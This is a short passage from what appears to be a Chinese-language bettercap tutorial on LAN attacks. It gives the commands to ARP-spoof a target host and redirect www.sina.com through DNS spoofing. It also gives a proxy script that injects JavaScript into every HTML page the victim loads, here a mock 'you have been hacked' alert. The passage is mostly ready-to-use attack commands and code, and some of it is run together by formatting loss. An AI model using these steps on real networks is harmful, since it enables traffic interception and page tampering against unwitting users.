### 1.5 DNS欺骗

DNS欺骗有一个前提，就是局域网内的主机的DNS服务器是局域网的网关，才能进行欺骗。如果是公网的DNS就不行了。

DNS欺骗之前我们需要利用ARP欺骗让目标机认为网关就是我们（攻击机），所以主机就会向我们发送DNS请求，这样就可以进行DNS欺骗了

  

开启ARP欺骗

*   
*   

```
set arp.spoof.targets 192.168.207.136arp.spoof on
```

```

```

然后进行DNS欺骗

*   
*   
*   

```
set dns.spoof.domains www.sina.comset dns.spoof.address 192.168.207.132dns.spoof on
```

### 1.6 JS脚本注入

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
vim /root/hacker.jsfunction onResponse(req,res){    if(res.ContentType.indexOf('text/html')==0){        var body=res.ReadBody();        if(body.indexOf('</head>')!=-1){            res.Body=body.replace(                '</head>',               '<script type="text/javascript">alert("电脑已经入侵！！！！")</script></head>'            );            }        }}
```
